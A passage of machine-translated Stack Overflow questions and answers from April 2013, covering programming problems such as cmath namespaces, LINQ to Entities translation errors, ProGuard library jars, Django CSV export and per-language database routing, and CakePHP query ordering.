出于某种原因，当页面重新加载时，有时不会发生这种情况。但大多数时候，这种情况会发生。当我使用谷歌字体时，这也不会发生。

所以我想知道这里出了什么问题？我认为加载页面资源（在这种情况下为字体）存在问题，但无论哪种方式都不应该发生......有什么想法吗？

# actionscript-3 - 处理顶部的 div 时的游戏 wmode 问题

> ID：16215092
> 
> 赞同：2
> 
> 时间：2013-04-25T12:42:34.153
> 
> 标签：actionscript-3

我正在使用 starling 进行渲染，因此我必须在我的应用程序中使用 wmode=direct 才能使其正常工作。

话虽如此，在某些情况下，我需要在闪光灯顶部显示一个框。但是当我展示盒子时，它会因为 wmode 出现在背面（适用于不透明）。

当我处于 wmode=direct 时，有什么方法可以在 flash 上显示内容？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-25T15:47:29.967

You can try showing that box within SWF on 2D level, that level is by design above Stage3D content.

# validation - 防止 MVC4 SelectList 成为“必需”

> ID：16215094
> 
> 赞同：0
> 
> 时间：2013-04-25T12:42:35.067
> 
> 标签：validation, razor, asp.net-mvc-4, data-annotations

我在 Razor 页面中有一个 SelectList，用户应该可以在其中选择或不选择他们认为合适的项目。

选定的项目值是一个整数，它是实体框架数据库优先表/类中的一个属性，我有一个与元数据相关联的伙伴类 - 但这个值没有任何重要的元数据，绝对**不是***必需*的属性。我之所以提到它，是因为我已经导入了 System.ComponentModel 和 System.ComponentModel.DataAnnotations 并且可能与某些事情有关。

在 Razor 页面中，我有：

```
@Html.DropDownListFor(x => x.blah, MySelectList, "(select)") 
```

该页面的源代码显示：

```
<select data-val="true" data-val-number="The field blah must be a number." data-val-required="The blah field is required." ...> 
```

我没有要求“必需”，但它就在那里：我如何抑制它？

克里斯平

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-25T13:00:02.307

我认为“blah”是一个整数......它总是需要的。您需要将 blah 设为可为空的 int。

# iphone - 如何评价此应用程序链接到您的 iPhone 应用程序

> ID：16215098
> 
> 赞同：-8
> 
> 时间：2013-04-25T12:42:46.343
> 
> 标签：iphone, ios, ios5, ios6

我正在制作一个简单的 iPhone 应用程序。我需要获取该应用程序的评分链接。我不知道如何获得该链接。谁能帮我解决这个问题？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-25T13:05:35.420

你可以用这个

```
 NSString *rateAppURL = @"itms-apps://itunes.apple.com/WebObjects/MZStore.woa/wa/viewContentsUserReviews?id=APPLE_ID&onlyLatestVersion=true&pageNumber=0&sortOrdering=1&type=Purple+Software";

    [[UIApplication sharedApplication] openURL:[NSURL URLWithString:rateAppURL]]; 
```

您可以从 iTunesconnect 获取[APPLE_ID。](https://itunesconnect.apple.com)

您需要转到提供应用程序标识符 Apple ID 的应用程序信息。

希望它可以帮助你。

# c++ - 找不到 sin(double)、sin(double&)、cos(double)、cos(double&)

> ID：16215099
> 
> 赞同：0
> 
> 时间：2013-04-25T12:42:54.200
> 
> 标签：c++, linker, trigonometry

这是一个非常简单的问题，让我感到困惑。

我收到一个源文件的以下错误，但另一个源文件没有：

```
4  src/Source2.cpp:1466: error: no matching function for call to ‘cos(double&)’
5  src/Source2.cpp:1466: error: no matching function for call to ‘sin(double)’
6  src/Source2.cpp:1467: error: no matching function for call to ‘sin(double&)’
7  src/Source2.cpp:1467: error: no matching function for call to ‘sin(double)’
8  src/Source2.cpp:1468: error: no matching function for call to ‘cos(double)’
9  src/Source2.cpp:1479: error: no matching function for call to ‘cos(double&)’
10 src/Source2.cpp:1479: error: no matching function for call to ‘sin(double)’
11 src/Source2.cpp:1480: error: no matching function for call to ‘sin(double&)’
12 src/Source2.cpp:1480: error: no matching function for call to ‘sin(double)’
13 src/Source2.cpp:1481: error: no matching function for call to ‘cos(double)’ 
```

这很奇怪，因为我有 Header1.hpp/Source1.cpp 工作，但 Header2.hpp/Source2.cpp 不工作。它们之间的区别在于 Source2 使用“doubles”而 Source1 使用“floats”，但使用 'sin(float)' 或 'cos(float)' 进行强制转换会产生与上述相同的错误。

我想我正在链接数学库，因为其他来源（相同的程序）可以工作并且没有抱怨。

任何建议表示赞赏=）

提前致谢！

代码片段：

Header1.hpp：

```
4  #include <iostream>
5
6  #include <stdio.h>
7  #include <math.h>
8  #include <ctime>
9
10 #define GL_GLEXT_PROTOTYPES
11
13 #include <OpenGL/gl.h>
14 #include <GLUT/glut.h> 
```

源1.cpp：

```
123   aim[0] = cos(camTheta)*sin(camPhi);
124   aim[1] = sin(camTheta)*sin(camPhi);
125   aim[2] = cos(camPhi);
126 
127   up[0] = cos(camTheta)*sin(camPhi - pih);
128   up[1] = sin(camTheta)*sin(camPhi - pih);
129   up[2] = cos(camPhi - pih); 
```

页眉2.hpp：

```
4  #include <algorithm>
5  #include <iostream>
6  #include <fstream>
7  #include <sstream>
8  #include <vector>
9  #include <cmath>
. . .
25 #define pih (M_PI/2.0)
26 #define pi M_PI
27 #define pi2 (2.0*M_PI) 
```

源代码2.cpp：

```
1453   double theta, phi;
1454   double x, y, z;
. . .
1464     node(n,0) = cos(theta)*sin(phi - pih);
1465     node(n,1) = sin(theta)*sin(phi - pih);
1466     node(n,2) = cos(phi - pih); 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-25T12:47:20.457

标头`<math.h>`将其名称放入全局命名空间。标头`<cmath>`将其名称放入命名空间`std`。（也允许将名称放入另一个名称空间）。代码使用`<math.h>`时，调用sin函数的方式是`sin(theta)`。当代码使用`<cmath>`时，调用 sin 函数的方式是`std::sin(theta)`（除非代码使用了 abomination `using namespace std`）。在 Source2.cpp 中，`#include`指令引入 ，`<cmath>`因此文件应使用限定名称而不是原始名称。或者将`#include`指令更改为 pull in `<math.h>`，这就是 Source1.cpp 所做的。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-25T12:44:49.433

将`-lm`“libm”（m = 数学）添加到您的链接行。

# c# - LINQ to Entities：涉及扩展方法的 Orderby 语句

> ID：16215100
> 
> 赞同：1
> 
> 时间：2013-04-25T12:42:56.380
> 
> 标签：c#, asp.net-mvc, linq

我正在为网站构建一个简单的搜索功能。目的是允许用户使用“bob staff”之类的查询，通过搜索框找到“游泳者”并将他们添加到列表中。

我决定解决的第一部分是允许用户通过组名进行搜索（在数据库中，所有游泳者都是一个组的一部分）。以下是我目前拥有的代码。

```
[HttpGet]
    public JsonResult searchForSwimmers(string q)
    {
        //designed to return [{name='foo',id='bar'}]

        String[] QueryTerms = q.Split(' '); //all the search terms are sep. by " "
        var groupResults = _db.SwimGroups.Where(g => g.Name.ContainsAny(QueryTerms)) 
            .OrderByDescending(g => g.Name.StartsWithAny(QueryTerms) ? 1 : 0)
            .ThenBy( g => g)
            .Select(g => new { name = g.Name, id = g.ID });

        return Json(groupResults,JsonRequestBehavior.AllowGet);
    } 
```

在第 8 行，调用了一个名为*StartsWithAny*的方法。这是我在以下文件中定义的扩展方法：

```
public static class StringUtils
    {
     public static Boolean StartsWithAny(this String str, params String[] Fragments)
        {
            foreach (String fragment in Fragments)
            {
                if (str.StartsWith(fragment))
                {
                    return true;
                }
            }
            return false;
        }
    } 
```

这个想法是，如果名称以其中一个术语开头，那么它的相关性应该更高。我承认这种逻辑是幼稚的并且存在缺陷，但是我认为这将是一个很好的例子来说明我遇到的问题。但是，当在我的 cshtml 页面中使用以下内容调用 searchForSimmers 时，代码会编译：（使用 tokenInput 库）

```
<script type="text/javascript">
     $(document).ready(function () {
          $("#demo-input-local").tokenInput("/Admin/searchForSwimmers");
     });
</script> 
```

我收到 500 内部服务器错误。错误信息如下：

```
LINQ to Entities does not recognize the method 'Boolean ContainsAny(System.String, System.String[])' method, and this method cannot be translated into a store expression. 
```

**ContainsAny 方法**

```
public static Boolean ContainsAny(this String str, List<String> Fragments)
        {
            foreach (String fragment in Fragments)
            {
                if(str.Contains(fragment))
                {
                    return true;
                }
            }
            return false;
        } 
```

我环顾四周，但找不到解决问题的方法。任何帮助将不胜感激，干杯。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-04-28T20:43:07.170

查看我的博客，我在其中为 IQueryable 创建了搜索扩展方法。

**更新：我创建了一篇新的博客文章，展示了实现目标所需的扩展方法**

~~[http://www.ninjanye.co.uk/2013/04/generic-iqueryable-or-search-for.html](http://www.ninjanye.co.uk/2013/04/generic-iqueryable-or-search-for.html)~~

[http://jnye.co/Posts/8/generic-iqueryable-or-search-for-multiple-search-terms-using-expression-trees](http://jnye.co/Posts/8/generic-iqueryable-or-search-for-multiple-search-terms-using-expression-trees)

问题是 linq 不知道如何将您的代码翻译成 SQL。

通过添加以下扩展方法：

```
public static class QueryableExtensions
{
    public static IQueryable<T> Search<T>(this IQueryable<T> source, Expression<Func<T, string>> stringProperty, params string[] searchTerms)
    {
        if (!searchTerms.Any())
        {
            return source;
        }

        Expression orExpression = null;
        foreach (var searchTerm in searchTerms)
        {
            //Create expression to represent x.[property].Contains(searchTerm)
            var searchTermExpression = Expression.Constant(searchTerm);
            var containsExpression = BuildContainsExpression(stringProperty, searchTermExpression);

            orExpression = BuildOrExpression(orExpression, containsExpression);
        }

        var completeExpression = Expression.Lambda<Func<T, bool>>(orExpression, stringProperty.Parameters);
        return source.Where(completeExpression);
    }

    private static Expression BuildOrExpression(Expression existingExpression, Expression expressionToAdd)
    {
        if (existingExpression == null)
        {
            return expressionToAdd;
        }

        //Build 'OR' expression for each property
        return Expression.OrElse(existingExpression, expressionToAdd);
    }

    private static MethodCallExpression BuildContainsExpression<T>(Expression<Func<T, string>> stringProperty, ConstantExpression searchTermExpression)
    {
        return Expression.Call(stringProperty.Body, typeof(string).GetMethod("Contains"), searchTermExpression);
    }

} 
```

这将允许您编写以下 lambda：

```
[HttpGet]
public JsonResult searchForSwimmers(string q)
{
    //designed to return [{name='foo',id='bar'}]

    String[] QueryTerms = q.Split(' '); //all the search terms are sep. by " "
    var groupResults = _db.SwimGroups.Search(g => g.Name, queryTerms) 
                                     .OrderByDescending(g => g.Name.StartsWithAny(QueryTerms) ? 1 : 0)
                                     .ThenBy( g => g)
                                     .Select(g => new { name = g.Name, id = g.ID });

    return Json(groupResults,JsonRequestBehavior.AllowGet);
} 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-04-25T12:45:15.067

那是因为您的方法`ContainsAny`或`StartsWithAny`扩展方法都不能转换为 SQL。

由于您的数据库表很小（如注释中所述），只需在执行and`.ToList()`之前调用即可解决您的查询。`Where``OrderBy`

尝试这个：

```
var groupResults = _db.SwimGroups
        .ToList() //evaluate the query, bring it into memory
        .Where(g => g.Name.ContainsAny(QueryTerms)) 
        .OrderByDescending(g => g.Name.StartsWithAny(QueryTerms) ? 1 : 0)
        .ThenBy( g => g)
        .Select(g => new { name = g.Name, id = g.ID }); 
```

# node.js - 从 NodeJS 服务器下载多个文件

> ID：16215102
> 
> 赞同：3
> 
> 时间：2013-04-25T12:42:59.083
> 
> 标签：node.js

我正在尝试支持将多个文件从我的 Node js 服务器下载到客户端。通过在我的 NodeJS 服务器中实现以下逻辑，我可以支持将单个文件发送到客户端。

```
res.download('group_documents/sample1.pdf','sample1.pdf', function(err){
  if (err) {
    console.log(err);
  } else {
    // decrement a download credit etc
  }
}); 
```

如何重写上述服务器逻辑以支持使用来自客户端的单个请求（浏览器或 curl 请求）下载多个文件？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2017-02-27T11:48:18.850

在网络浏览器上，您不能一次下载多个文件。但是您可以下载所有必需文件的存档文件。使用**express-zip** npm 包，您可以轻松完成。

[https://github.com/thrackle/express-zip](https://github.com/thrackle/express-zip)

安装快速压缩包。

```
npm install express-zip 
```

使用以下代码：

```
res.zip(files); 
```

files 是一个对象数组。每个对象应该是：

```
{ path : 'path/to/file', name : 'fileName'} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-25T12:45:51.177

如果您的目标客户端是 Web 浏览器，那么您不能，因为 http 协议不允许单个请求进行多次下载。

如果您真的需要这样做，那么您需要编写一个自定义客户端应用程序，或者（更简单地）在传输文件之前将文件压缩到某个存档中。

# java - 配置 proguard 以排除扩展 android.content.Context 的库 jar

> ID：16215106
> 
> 赞同：4
> 
> 时间：2013-04-25T12:43:15.180
> 
> 标签：java, android, proguard

我正在将一个库集成到一个设备中，该项目将嵌入到设备操作系统中。为此，我们正在集成一个覆盖 Android 框架上下文的库 jar。

因此，尝试为应用程序启用 Proguard 会给我以下错误 - “有 220 个库类实例，具体取决于程序类”。

所有这些文件都是小部件和视图。我怎样才能解决这个问题？

这是我的 proguard-project.txt 的内容

```
-injars      bin/classes
-outjars     bin/classes-processed.jar
-libraryjars /Users/me/android-sdk-mac_86/platforms/android-15/android.jar
-libraryjars libs/library-that-overrides-context.jar

-keep public class * extends android.app.Activity
-keep public class * extends android.app.Application
-keep public class * extends android.app.Service
-keep public class * extends android.content.BroadcastReceiver
-keep public class * extends android.content.ContentProvider
-keep public class * extends android.content.Context 
```

这是我的 proguard-android.txt 的内容

```
# This is a configuration file for ProGuard.
# http://proguard.sourceforge.net/index.html#manual/usage.html

-dontusemixedcaseclassnames
-dontskipnonpubliclibraryclasses
-verbose

# Optimization is turned off by default. Dex does not like code run
# through the ProGuard optimize and preverify steps (and performs some
# of these optimizations on its own).
-dontoptimize
-dontpreverify
# Note that if you want to enable optimization, you cannot just
# include optimization flags in your own project configuration file;
# instead you will need to point to the
# "proguard-android-optimize.txt" file instead of this one from your
# project.properties file.

-keepattributes *Annotation*
-keep public class com.google.vending.licensing.ILicensingService
-keep public class com.android.vending.licensing.ILicensingService

# For native methods, see http://proguard.sourceforge.net/manual/examples.html#native
-keepclasseswithmembernames class * {
    native <methods>;
}

# keep setters in Views so that animations can still work.
# see http://proguard.sourceforge.net/manual/examples.html#beans
-keepclassmembers public class * extends android.view.View {
   void set*(***);
   *** get*();
}

# We want to keep methods in Activity that could be used in the XML attribute onClick
-keepclassmembers class * extends android.app.Activity {
   public void *(android.view.View);
}

# For enumeration classes, see http://proguard.sourceforge.net/manual/examples.html#enumerations
-keepclassmembers enum * {
    public static **[] values();
    public static ** valueOf(java.lang.String);
}

-keep class * implements android.os.Parcelable {
  public static final android.os.Parcelable$Creator *;
}

-keepclassmembers class **.R$* {
    public static <fields>;
}

# The support library contains references to newer platform versions.
# Don't warn about those in case this app is linking against an older
# platform version.  We know about them, and they are safe.
-dontwarn android.support.** 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-26T00:07:48.810

Android Ant/Eclipse 构建会自动为您指定所有必要的 -injars/-outjars/-libraryjars 选项。如果您有自定义构建过程，则应仅指定这些选项。否则，您会收到很多关于重复类和可能的其他问题的警告。

如果您确实需要指定 -injars/-outjars/-libraryjars 选项，则使用 -injars 指定的类可以依赖于使用 -libraryjars 指定的类，但不能反过来。参照。ProGuard 手册 > 疑难解答 >[警告：库类 ... 取决于程序类 ...](http://proguard.sourceforge.net/manual/troubleshooting.html#dependency)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-05-01T16:18:09.727

即使我将我的库标记为 libraryjar，我也必须添加这些行

`-keep public class android.content.** { *; }`到项目 proguard 配置文件来解决问题。

# jquery - jQuery 和非 Unicode 字符

> ID：16215109
> 
> 赞同：2
> 
> 时间：2013-04-25T12:43:24.533
> 
> 标签：jquery, character-encoding, non-unicode

我正在尝试使用 jQuery 从数据库中获取自动完成功能。它适用于英语值，但我有一些阿拉伯语行，它们显示为（????）。

我开始我的所有页面：

```
<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
<Link href="style2.css" rel="stylesheet" type="text/css">
<style type="text/css"></style> 
```

我的数据库采用 UTF8 格式。我还包括与 DB 文件的连接，其中显示：

```
$conn = mysql_connect("localhost","root","") or die ($dberror1);
mysql_select_db("finishing", $conn);
mysql_query("SET NAMES 'utf8'"); 
mysql_query('SET CHARACTER SET utf8') 
```

注意：我在阿拉伯语中的所有其他项目都可以正常工作。这只是我遇到问题的 jQuery 自动完成。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-25T20:40:38.280

好的，只需在搜索文件中包含与 DB 脚本的连接即可解决，显然当我指的是外部文件时，变量存在冲突。有效的脚本正是我之前发布的.. 让我感到惊讶的是，我整天都在网上寻找，但对非 unicode 问题没有任何明确的答案.. 因此我建议（以我的谦虚意见始终在您使用非 unicode 语言工作的所有文件中包含这 4 行脚本..感谢所有试图提供帮助的人

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-25T12:50:43.380

更改元标记中的字符集类型：

```
<meta http-equiv="Content-Type" content="text/html; charset=charset=iso-8859-6"> 
```

`charset=iso-8859-6`用于在浏览器的 HTML 页面中支持阿拉伯语。

**编辑：**

好吧，这肯定会对您有所帮助。

```
<script type="text/javascript" charset="ISO-8859-6">
// your code from where you are making the auto complete 
// either ajax request or any thing
</script> 
```

只需在您的脚本标签中添加此字符集。

有关更多信息，[请参阅链接](http://joconner.com/2008/09/javascript-file-encoding/)。

# python - 在 django-admin 中使用 django 将用户数据导出到 CSV

> ID：16215110
> 
> 赞同：3
> 
> 时间：2013-04-25T12:43:27.077
> 
> 标签：python, django, csv, django-models, django-admin

我需要导出到我的数据库的 csv 用户，所以我或多或少地清楚（[https://docs.djangoproject.com/en/dev/howto/outputting-csv/](https://docs.djangoproject.com/en/dev/howto/outputting-csv/)），但我需要选择哪个字段是以前导出的。

是否可以使用模型显示您可以选择要导出的字段？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2020-07-15T05:58:23.307

您的问题的最佳解决方案是在您的用户管理员中创建一个操作。操作方法如下：转到您的 admin.py 并执行此操作

```
from django.contrib.auth import get_user_model
from django.http import HttpResponse
import csv, datetime

User = get_user_model()

def export_to_csv(modeladmin, request, queryset):
    opts = modeladmin.model._meta
    response = HttpResponse(content_type='text/csv')
    response['Content-Disposition'] = 'attachment;' 'filename={}.csv'.format(opts.verbose_name)
    writer = csv.writer(response)
    fields = [field for field in opts.get_fields() if not field.many_to_many and not field.one_to_many]
    # Write a first row with header information
    writer.writerow([field.verbose_name for field in fields])
    # Write data rows
    for obj in queryset:
        data_row = []
        for field in fields:
            value = getattr(obj, field.name)
            if isinstance(value, datetime.datetime):
                value = value.strftime('%d/%m/%Y')
            data_row.append(value)
        writer.writerow(data_row)

    return response

export_to_csv.short_description = 'Export to CSV'  #short description

@admin.register(User)
class UserAdmin(admin.ModelAdmin):
    '''
    Registers the action in your model admin
    '''
    actions = [export_to_csv] 
```

有了这个，您将能够选择要导出其数据并立即导出的特定用户。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-04-25T13:02:08.603

从控制台，您可以简单地尝试

```
>>> from django.contrib.auth.models import User
>>> with open('myfile.csv', 'w') as csv:
...     for user in User.objects.all():
...         d = '%s, %s, %s,\n' % (user.username, user.last_name, user.first_name)
...         csv.write(d) 
```

where 设置`d`为您要保存的任何字段。

当然，如果您想多次执行此操作，这将是一件痛苦的事情 - 创建[自定义管理命令](https://docs.djangoproject.com/en/dev/howto/custom-management-commands/)可能是一个更好的主意。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2021-05-09T10:24:34.980

从 Django 3.2 开始，您还必须`export_as_csv`通过添加装饰器来注册为“动作”。有关官方文档，请参阅此[链接](https://docs.djangoproject.com/en/3.2/ref/contrib/admin/actions/)。

# ios - 以编程方式检查联系人的 iMessage 支持

> ID：16215112
> 
> 赞同：7
> 
> 时间：2013-04-25T12:43:42.237
> 
> 标签：ios, objective-c, imessage

我正在开发一个`UITableView`在我的 iPhone 上加载联系人的应用程序。它工作正常，我的问题是我想知道收件人的手机号码或电子邮件地址是否支持 iMessage 或不使用 Objective-C。如果我不清楚，请告诉我。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-04-25T12:55:25.870

这不能通过公共 SDK 获得。如果您有越狱设备，您可以使用 ChatKit 框架。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-04-25T12:57:12.517

没有公开可用的内容，因此如果您打算在应用商店上传应用，则不应尝试此操作。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2013-04-25T12:54:21.610

当前的 iOS SDK 中没有公共 API 来执行此操作。

如果您确实设法找到某种私有 API 来执行此操作，那么如果您将其提交到 App Store，您的应用程序可能会被拒绝。

# .htaccess - URL重写不能按预期工作apache2

> ID：16215113
> 
> 赞同：0
> 
> 时间：2013-04-25T12:43:43.617
> 
> 标签：.htaccess, mod-rewrite, url-rewriting

作品：

```
 RewriteRule  index2.php/xyz/ index2.php/?pt=xyz [QSA,L] 
```

不工作：

```
 RewriteRule  index2.php/(.+)$/ index2.php/?pt=$1 [QSA,L] 
```

我尝试使用上面的重写规则，但不知何故它不起作用...... $1 保持为空

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-25T12:46:18.603

为什么`$`在里面`(.+)`呢？在大多数正则表达式引擎中，美元符号表示行尾。如果你把它拿出来会发生什么？

# c# - WPF 连续文本

> ID：16215116
> 
> 赞同：0
> 
> 时间：2013-04-25T12:44:06.477
> 
> 标签：c#, wpf

哪个元素好，如果我从我的 COM 获得连续文本并且我想将它显示在一个 Box 中，比如 textBox。

我想保留旧文本，但添加一个新行，例如：

```
COM Data1: 0xFF 14:10 PM
COM Data1: 0xA3 14:10 PM
COM Data1: 0x12 14:11 PM
.... 
```

如果我使用文本框并执行此操作

```
txtbox.Text = comData; 
```

它取代了我的旧文本。

谢谢

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-25T12:46:15.197

使用 a`listbox`或 a `listview`,

一个一个地添加元素。

所以例如在一个循环中你可以做

```
for each item in ComData.item

listbox1.add = item

loop 
```

这将在最后一行下方添加一行。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-04-25T12:45:27.053

你可以做：

```
txtbox.Text = txtBox.Text + Environment.NewLine + comData; 
```

您也可以使用[StringBuilder](http://msdn.microsoft.com/en-us/library/system.text.stringbuilder.aspx)进行字符串连接，例如：

```
StringBuilder sb = new StringBuilder();

public void yourMethod()
{
  sb.Append(comData);
  sb.Append(Environment.NewLine);
  txtBox.Text = sb.ToString();
} 
```

*（为什么使用 StringBuilder 参见：[Stringbuilder vs String.Concat](https://stackoverflow.com/questions/4191079/stringbuilder-vs-string-concat)）*

# java - 为什么在 MBean 定义中强调类型化的属性/方法？

> ID：16215119
> 
> 赞同：0
> 
> 时间：2013-04-25T12:44:30.380
> 
> 标签：java, jmx, mbeans

根据[Oracle 对 MBean 的定义](http://docs.oracle.com/javase/1.5.0/docs/guide/management/overview.html)：

> MBean 是托管 bean，代表要管理的资源的 Java 对象。MBean 有一个管理接口，包括：
> 
> 1.  可以读取和写入的命名和类型属性。
> 2.  可以调用的命名和类型化操作
> 3.  可以>由 MBean 发出的类型化通知

为什么在上面的每一点都强调*打字？*Java 是一种强类型语言，Java 类中的所有属性/方法都有一个附加类型。所以我发现这个定义令人困惑。还是我在这里遗漏了一些基本的东西？他们是否使用 typed 来表示完全不同的东西？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-25T14:24:55.050

JMX 具有更多限制性的类型特征，因为类型本身通常为 bean 属性或操作提供一种“身份”或签名形式。此外，JMX 支持[开放类型](http://docs.oracle.com/javase/1.5.0/docs/api/javax/management/openmbean/package-summary.html)的概念，其中复杂类型被分解为其原始定义，因此它可以在 JVM 外部表示（可能在 JConsole 中，该特定类可能不在类路径中。）

不过不要挂断它……这意味着 MBean 的属性是由它们的名称和类型定义的。真的不足为奇:)

# backbone.js - 如何将 Firebase 位置设置为主干模型 ID？

> ID：16215120
> 
> 赞同：0
> 
> 时间：2013-04-25T12:44:32.160
> 
> 标签：backbone.js, firebase, backfire

我使用 BackFire - Firebase 与 Backbone.js 的集成

检查[BackFire 演示](http://firebase.github.io/backfire/)应用程序，我看到 Firebase 位置设置为“根”键和 ID 键的值。

```
JSON response from Firebase

 {
  "-It-MYaWEFBI1QGD8PXB": 
    {
     "title":dummy title",
     "id": "-It-MYaWEFBI1QGD8PXB"
    }
 } 
```

在模型中，我看到 Firebase 位置设置为模型 ID。

```
Backbone Model attributes 

attributes: {
  id: '-IswDV_2rwZu3WHO0giQ'
  title: 'dummy title'
},
id : '-IswDV_2rwZu3WHO0giQ' 
```

我想知道创建上述响应的 Firebase Forge（后端）中的数据结构如何？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-25T14:14:10.417

通过转到 TODO 页面并输入以下命令：

```
new Firebase('https://backbone.firebaseio.com').once('value', function(ss) {
console.log(JSON.stringify(ss.val(), null, 2))}); 
```

我能够看到数据结构如下所示：

```
{
  "-It-MYaWEFBI1QGD8PXB": {
    "id": "-It-MYaWEFBI1QGD8PXB",
    "title": "prepare lunch"
  },
  "-It-Mch8_bA23vkwAbUZ": {
    "id": "-It-Mch8_bA23vkwAbUZ",
    "title": "install Linux"
  }
} 
```

所以基本上，因为它是一个演示，Anant 已经服从 KISS 并将待办事项放在根级别。当然，在复杂的应用程序中，您需要有更多的嵌套和深度。

# database - 基于语言的 URL 和数据库路由

> ID：16215122
> 
> 赞同：2
> 
> 时间：2013-04-25T12:44:38.620
> 
> 标签：database, django, multilingual

我有以下形式的网址：

```
http://example.com/[language_code]/xxx 
```

我需要做：
1.根据语言代码，如果语言代码不支持，我想选择合适的DB或引发Http 404。
2\. 我想最好将语言代码保存在请求对象中，这样我就可以在我的模板中访问它。
3\. 我希望我的 urls.py 看起来不像这样：

```
url(r'^(?P<lang>\w+)/xxx/$', 'my_app.views.xxx') 
```

反而：

```
url(r'^xxx/$', 'my_app.views.xxx') 
```

所以 django 将完全忽略 URL 中的语言代码。

谁能告诉我这对 django 是否可行，或者我应该寻找另一种解决方案？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-05-16T08:20:32.027

我设法弄清楚了这一点。首先，您需要阅读文档：[https ://docs.djangoproject.com/en/dev/topics/i18n/translation/](https://docs.djangoproject.com/en/dev/topics/i18n/translation/)

@1 - 我基于[http://djangosnippets.org/snippets/2037/](http://djangosnippets.org/snippets/2037/)编写了自己的中间件（将这个中间件作为`MIDDLEWARE_CLASSES`列表中的第一个至关重要）

```
import threading
from django.http import Http404
from django.conf import settings

request_cfg = threading.local()

class RouterMiddleware(object):
    def process_view(self, request, view_func, view_args, view_kwargs):
        lang = request.LANGUAGE_CODE
        if lang in settings.LANGUAGES:
            request_cfg.lang = lang
        else:
            raise Http404()

    def process_response(self, request, response):
        if hasattr(request_cfg, 'lang'):
            del request_cfg.lang
        return response

class DatabaseRouter(object):
    def _default_db(self):
        if hasattr(request_cfg, 'lang') and request_cfg.lang in settings.DATABASES:
            return request_cfg.lang
        else:
            return 'default'

    def db_for_read(self, model, **hints):
        return self._default_db()

    def db_for_write(self, model, **hints):
        return self._default_db() 
```

@2 - 可以使用`request.LANGUAGE_CODE`

@3 - 在文档中有解释：[https ://docs.djangoproject.com/en/dev/topics/i18n/translation/#internationalization-in-url-patterns](https://docs.djangoproject.com/en/dev/topics/i18n/translation/#internationalization-in-url-patterns)

# sql - CakePHP 发现包含有深度订单

> ID：16215124
> 
> 赞同：0
> 
> 时间：2013-04-25T12:44:41.253
> 
> 标签：sql, cakephp, relationship

我有以下型号：

```
Client hasMany Loan
Loan belongsTo Book
Loan belongsTo Client
Book belongsTo BookType 
```

我的桌子看起来像这样：

```
clients { id, name, ... }
loans { id, client_id, book_id }
books { id, book_type_id }
book_types { id, title } 
```

我想通过客户 ID 查找所有贷款。这是我尝试过的：

```
$client = $this->Client->find('first', array(
    'conditions' => array(
        'Client.id' => $id
    ),
    'contain' => array(
        'Loan' => array(
            'Book' => array(
                'BookType' => array(
                    'order' => 'sachtitel DESC'
                )
            )
        )
    )
)); 
```

这不能按预期工作。我的数据没有按照我想要的方式排序。

我究竟做错了什么？

**编辑：**好的，看来，只要我使用*contains*，我就不能使用顺序，因为 CakePHP 会生成多个查询来获取数据。因此我的订单没有用，因为 CakePHP 生成的查询只获取了 1 行。我将如何使用联接从表中获取数据？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-25T13:04:58.290

在创建关系时定义顺序。尝试这样的事情：

```
$this->Book->bindModel(array(
    'belongsTo' => array(
       'BookType' => array('order' => 'sachtitel DESC' )
)); 
```

# javascript - Jquery 1.9 - 加载后声明变量

> ID：16215129
> 
> 赞同：0
> 
> 时间：2013-04-25T12:44:45.967
> 
> 标签：javascript, jquery, jquery-load

```
<div class="main_content grid_9 clearfix omega">
    <div class="basic_info">
        <p>You have
        <?php
            $msg =  count($messages);
            $msg_tekst = ($msg  == 1) ? 'message.' : 'messages.';
        echo $msg . ' ' . $msg_tekst;
         ?>
        </p>
        <p>Show all
            <a role=show_msg  href="<?php echo base_url('admin/contact_messages/unread') ?>">unread </a>
            |
            <a role=show_msg  href="<?php echo base_url('admin/contact_messages/read') ?>">read </a>
            messages.
        </p>
    </div>

    <!-- START CONTACT MESSAGES -->
    <div class="contact_messages">
        <?php foreach ($messages as $msg) : ?>
            <article class="box contact_message clearfix">
                <h2><?php echo $msg['name'] ?></h2>
                <p><?php echo $msg['comment'] ?></p>
                <a role=delete href="<?php echo base_url('admin/contact_messages_delete/' .  $msg['id_contact']) ?>">Delete Message</a>

                <?php if($msg['read'] == 0) : ?>
                    <a role=read href="<?php echo base_url('admin/contact_messages_read/' .  $msg['id_contact'] . '/read') ?>">Mark as read</a>
                <?php else: ?>
                    <a role=unread href="<?php echo base_url('admin/contact_messages_read/' .  $msg['id_contact']) ?>">Mark as unread</a>
                <?php endif ?>
            </article>
        <?php endforeach; ?>
    </div>
    <!-- END CONTACT MESSAGES -->

</div>
<!-- END MAIN_CONTENT -->

<script>
 $(document).ready(function() {

    var basic_info = $('.basic_info'),
    show_msg = basic_info.find('a[role=show_msg]'),
    contact_messages = $('.contact_messages'),
